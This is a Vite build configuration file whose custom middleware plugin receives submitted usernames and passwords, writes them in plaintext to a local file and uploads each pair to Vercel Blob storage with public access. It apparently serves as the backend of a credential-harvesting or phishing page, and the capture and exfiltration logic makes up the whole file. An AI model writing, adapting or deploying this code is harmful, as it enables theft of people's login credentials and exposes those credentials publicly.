import { defineConfig, loadEnv } from 'vite'
import react from '@vitejs/plugin-react'
import fs from 'fs'
import path from 'path'
import { fileURLToPath } from 'url'
import { put } from '@vercel/blob'

const __dirname = path.dirname(fileURLToPath(import.meta.url))

// https://vite.dev/config/
export default defineConfig(({ mode }) => {
  // Load environment variables from .env and .env.local files
  const env = loadEnv(mode, process.cwd(), '')

  return {
    plugins: [
      react(),
      {
        name: 'save-credentials',
        configureServer(server) {
          server.middlewares.use((req, res, next) => {
            if (req.method === 'POST' && req.url === '/api/save-credentials') {
              let body = '';
              req.on('data', (chunk) => {
                body += chunk.toString();
              });
              req.on('end', async () => {
                try {
                  const { username, password } = JSON.parse(body);
                  const filePath = path.join(__dirname, 'credentials.txt');
                  const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' });
                  const logEntry = `Timestamp: ${timestamp}\nUsername: ${username}\nPassword: ${password}\n-------------------------\n`;
                  fs.appendFileSync(filePath, logEntry, 'utf8');

                  // Save to Vercel Blob if token is available
                  const token = env.BLOB_READ_WRITE_TOKEN;
                  console.log("[Vite Middleware] Loaded BLOB_READ_WRITE_TOKEN:", token ? "Found" : "NOT FOUND");

                  if (token) {
                    const timestampMs = Date.now();
                    const dateStr = new Date().toISOString().replace(/[:.]/g, '-');
                    const randomStr = Math.random().toString(36).substring(2, 8);
                    const filename = `credentials/log_${dateStr}_${randomStr}.json`;

                    const payload = JSON.stringify({
                      username,
                      password,
                      timestamp: timestampMs,
                      dateString: timestamp
                    }, null, 2);

                    console.log("[Vite Middleware] Uploading to Vercel Blob as", filename);
                    const blob = await put(filename, payload, {
                      access: 'public',
                      contentType: 'application/json',
                      token: token,
                    });
                    console.log("[Vite Middleware] Vercel Blob upload SUCCESS:", blob.url);
                  } else {
                    console.warn("[Vite Middleware] Skipping Vercel Blob write because token is missing.");
                  }

                  res.writeHead(200, { 'Content-Type': 'application/json' });
                  res.end(JSON.stringify({ success: true, message: 'Saved successfully' }));
                } catch (error) {
                  res.writeHead(500, { 'Content-Type': 'application/json' });
                  res.end(JSON.stringify({ success: false, error: error.message }));
                }
              });
            } else {
              next();
            }
          });
        }
      }
    ],
  }
})
